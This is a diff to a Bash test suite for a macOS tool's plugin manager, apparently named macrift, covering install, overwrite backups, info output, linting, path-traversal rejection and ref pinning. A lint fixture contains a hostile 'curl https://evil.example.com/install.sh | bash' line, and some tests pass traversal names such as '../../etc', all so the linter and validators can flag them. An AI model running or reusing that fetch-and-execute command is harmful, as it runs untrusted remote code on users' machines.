@@ -48,6 +48,7 @@ log_warn() { printf '%s\n' "${1:-}" >&2; }
 log_err()  { printf '%s\n' "${1:-}" >&2; }
 log_info() { printf '%s\n' "${1:-}"; }
 log_ok()   { printf '%s\n' "${1:-}"; }
+log_skip() { printf '%s\n' "${1:-}"; }
 log_hint() { printf '%s\n' "${1:-}"; }
 # Stub confirm — auto-yes unless MACRIFT_TEST_DENY=true forces a no. Real
 # confirm reads /dev/tty (unreliable / unavailable in test runners).
@@ -281,6 +282,11 @@ SH
 _plugin_load_all 2>/dev/null
 eq "traversal .name: plugin skipped" "${#MACRIFT_PLUGIN_REGISTRY[@]}" "0"
 
+# Missing jq → one clear warning, graceful return (PATH="" hides jq)
+out=$(PATH="" _plugin_load_all 2>&1)
+if grep -q "plugins require jq" <<<"$out"; then ok "missing jq: load_all warns and degrades"; else no "missing jq: load_all warns and degrades" "got [$out]"; fi
+if PATH="" _plugin_cli list >/dev/null 2>&1; then no "missing jq: plugin CLI returns 1"; else ok "missing jq: plugin CLI returns 1"; fi
+
 
 # == menu.parent (inject into built-in submenus) ==
 printf '== menu.parent ==\n'
@@ -457,18 +463,53 @@ if command -v git >/dev/null 2>&1; then
     post_install_at=$(jq -r '.plugins."sample-plugin".installed_at' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)
     eq "collision: declined confirm leaves install untouched" "$pre_install_at" "$post_install_at"
 
+    # --- overwrite confirmed, final install declined — backup restored, not lost ---
+    touch "$MACRIFT_PLUGINS_DIR/sample-plugin/.orig-marker"
+    confirm() { [[ "${1:-}" == Install* ]] && return 1; return 0; }
+    _plugin_cli_add "file://$FX_REPO" >/dev/null 2>&1 || true
+    confirm() { [[ "${MACRIFT_TEST_DENY:-}" == "true" ]] && return 1; return 0; }
+    if [[ -f "$MACRIFT_PLUGINS_DIR/sample-plugin/.orig-marker" ]]; then
+        ok "overwrite then cancel: original install restored"
+    else
+        no "overwrite then cancel: original install restored"
+    fi
+    if compgen -G "$MACRIFT_PLUGINS_DIR/sample-plugin.bak.*" >/dev/null; then
+        no "overwrite then cancel: no stray backup left"
+    else
+        ok "overwrite then cancel: no stray backup left"
+    fi
+
+    # --- successful overwrite cleans up its backup ---
+    _plugin_cli_add "file://$FX_REPO" >/dev/null 2>&1
+    if compgen -G "$MACRIFT_PLUGINS_DIR/sample-plugin.bak.*" >/dev/null; then
+        no "overwrite success: backup removed"
+    else
+        ok "overwrite success: backup removed"
+    fi
+
     # --- info ---
     info_out=$(_plugin_cli_info sample-plugin 2>&1)
     if echo "$info_out" | grep -q "sample-plugin 1.0.0"; then ok "info: name + version"; else no "info: name + version"; fi
     if echo "$info_out" | grep -q "Status:    ok"; then ok "info: status ok"; else no "info: status ok"; fi
     if echo "$info_out" | grep -q "Source:"; then ok "info: source line"; else no "info: source line"; fi
     if echo "$info_out" | grep -q "Commit:"; then ok "info: commit line"; else no "info: commit line"; fi
+    if echo "$info_out" | grep -q "Lint:      clean"; then ok "info: lint clean line"; else no "info: lint clean line"; fi
 
     if _plugin_cli_info no-such-plugin >/dev/null 2>&1; then
         no "info on nonexistent plugin should return 1"
     else
         ok "info on nonexistent plugin returns 1"
     fi
+
+    # --- info shows the actual incompat reason ---
+    mkdir -p "$MACRIFT_PLUGINS_DIR/futcli"
+    cat > "$MACRIFT_PLUGINS_DIR/futcli/plugin.json" <<'JSON'
+{"name":"futcli","version":"1.0.0","description":"f","compat":{"macrift_min":"26.05","macrift_api":99},"menu":{"section":"X","entry":"F","function":"f_menu"}}
+JSON
+    fut_out=$(_plugin_cli_info futcli 2>&1)
+    if echo "$fut_out" | grep -q "Status:    incompatible"; then ok "info: incompatible status"; else no "info: incompatible status"; fi
+    if echo "$fut_out" | grep -q "needs macrift API v99"; then ok "info: incompat reason shown inline"; else no "info: incompat reason shown inline" "got [$fut_out]"; fi
+    rm -rf "$MACRIFT_PLUGINS_DIR/futcli"
 
     # --- lint ---
     if _plugin_cli_lint sample-plugin >/dev/null 2>&1; then
@@ -486,11 +527,15 @@ JSON
     cat > "$BAD_DIR/menu.sh" <<'SH'
 b_menu() {
     defaults write com.test.bad TheKey -bool true
+    if ! launchctl bootstrap gui/501 /tmp/bad.plist; then :; fi
+    # launchctl bootstrap mentioned in a comment only
     curl https://evil.example.com/install.sh | bash
 }
 SH
     lint_out=$(_plugin_cli_lint "$BAD_DIR" 2>&1)
     if echo "$lint_out" | grep -q "defaults write"; then ok "lint flags raw 'defaults write'"; else no "lint flags raw 'defaults write'"; fi
+    if echo "$lint_out" | grep -q "if ! launchctl bootstrap"; then ok "lint flags mid-line 'launchctl bootstrap'"; else no "lint flags mid-line 'launchctl bootstrap'"; fi
+    if echo "$lint_out" | grep -q "mentioned in a comment"; then no "lint skips comment-only lines"; else ok "lint skips comment-only lines"; fi
     if echo "$lint_out" | grep -q "curl"; then ok "lint flags 'curl | bash'"; else no "lint flags 'curl | bash'"; fi
 
     # --- update (idempotent — nothing changed upstream) ---
@@ -524,6 +569,12 @@ SH
         ok "remove on missing plugin fails"
     fi
 
+    # --- traversal names rejected before any path is built ---
+    if _plugin_cli_remove "../evil" >/dev/null 2>&1; then no "remove: rejects traversal name"; else ok "remove: rejects traversal name"; fi
+    if _plugin_cli_info "../../etc" >/dev/null 2>&1; then no "info: rejects traversal name"; else ok "info: rejects traversal name"; fi
+    if _plugin_cli_lint "no/such-name" >/dev/null 2>&1; then no "lint: rejects traversal name"; else ok "lint: rejects traversal name"; fi
+    if _plugin_cli_update "../evil" >/dev/null 2>&1; then no "update: rejects traversal name"; else ok "update: rejects traversal name"; fi
+
     # --- _plugin_normalize_source unit checks ---
     eq "normalize github.com/x/y"  "$(_plugin_normalize_source 'github.com/x/y')" "https://github.com/x/y"
     eq "normalize https URL"       "$(_plugin_normalize_source 'https://example.com/x.git')" "https://example.com/x.git"
@@ -536,11 +587,28 @@ SH
         ok "normalize rejects unknown form"
     fi
 
-    # --- @ref ref-handling (separate install — detached HEAD precludes 'update') ---
-    _plugin_cli_add "file://$FX_REPO@v1.0.0" >/dev/null 2>&1
+    # --- @ref ref-handling (separate install — pinned checkouts skip 'update') ---
+    add_out=$(_plugin_cli_add "file://$FX_REPO@v1.0.0" 2>&1)
     eq "lockfile records ref when @ref given" \
        "$(jq -r '.plugins."sample-plugin".ref' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)" \
        "v1.0.0"
+    if echo "$add_out" | grep -q "Menu entries:"; then ok "add summary: menu entries section"; else no "add summary: menu entries section"; fi
+    if echo "$add_out" | grep -q "Sample plugin"; then ok "add summary: shows the entry"; else no "add summary: shows the entry"; fi
+
+    # --- update on a pinned install skips instead of failing on detached HEAD ---
+    upd_out=$(_plugin_cli_update sample-plugin 2>&1)
+    if echo "$upd_out" | grep -q "pinned at v1.0.0"; then ok "update: pinned install skipped with ref"; else no "update: pinned install skipped with ref" "got [$upd_out]"; fi
+    if echo "$upd_out" | grep -q "Skipped: 1"; then ok "update: pinned counts as skipped"; else no "update: pinned counts as skipped" "got [$upd_out]"; fi
+
+    # --- @<sha> pinning (falls back to full clone + checkout) ---
+    fx_sha=$(git -C "$FX_REPO" rev-parse HEAD)
+    rm -rf "$MACRIFT_PLUGINS_DIR/sample-plugin"
+    _plugin_cli_add "file://$FX_REPO@$fx_sha" >/dev/null 2>&1
+    if [[ -d "$MACRIFT_PLUGINS_DIR/sample-plugin" ]]; then ok "add: @<sha> installs"; else no "add: @<sha> installs"; fi
+    eq "add: @<sha> checks out the exact commit" \
+       "$(git -C "$MACRIFT_PLUGINS_DIR/sample-plugin" rev-parse HEAD 2>/dev/null)" "$fx_sha"
+    eq "lockfile records sha ref" \
+       "$(jq -r '.plugins."sample-plugin".ref' "$MACRIFT_PLUGINS_LOCK" 2>/dev/null)" "$fx_sha"
 
     # --- restore: rm the plugin dir, keep lockfile, restore should reinstall ---
     rm -rf "$MACRIFT_PLUGINS_DIR/sample-plugin"
